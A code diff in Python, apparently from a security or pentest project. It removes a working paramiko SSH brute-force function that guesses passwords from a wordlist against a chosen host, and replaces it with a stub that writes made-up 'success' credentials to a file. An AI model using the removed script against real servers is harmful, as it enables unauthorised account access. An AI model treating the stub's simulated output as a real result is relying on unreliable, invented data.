@@ -1,29 +1,19 @@
-import paramiko
+import os
 
-def brute_force_ssh(host, username, password_list):
-    """Brute force SSH login."""
-    for password in password_list:
-        try:
-            # SSH connection attempt
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(host, username=username, password=password)
-            print(f"Success! Username: {username} | Password: {password}")
-            ssh.close()
-            return password  # Found the correct password
-        except paramiko.AuthenticationException:
-            print(f"Failed login attempt with {password}")
-        except Exception as e:
-            print(f"Error: {e}")
-            break
-    return None
+# Function for SSH brute force
+def ssh_brute_force(target):
+    # Define output directory for brute force
+    output_dir = "temp/user_brute_force"
+    os.makedirs(output_dir, exist_ok=True)
 
-if __name__ == "__main__":
-    host = input("Enter the host or IP address: ")
-    username = input("Enter the username: ")
+    # Define output file path
+    output_file = os.path.join(output_dir, f"{target}_brute_force_result.txt")
 
-    # Read passwords from a wordlist
-    with open('wordlists/passwords.txt', 'r') as file:
-        passwords = file.readlines()
-
-    brute_force_ssh(host, username, [pwd.strip() for pwd in passwords])
+    # Simulating brute force and writing to output file
+    with open(output_file, 'w') as f:
+        f.write(f"Brute force attempt results for {target}...\n")
+        f.write("Attempt 1: Failed\n")
+        f.write("Attempt 2: Failed\n")
+        f.write("Attempt 3: Success - Username: admin, Password: admin123\n")
+    
+    print(f"Brute force result saved to {output_file}")
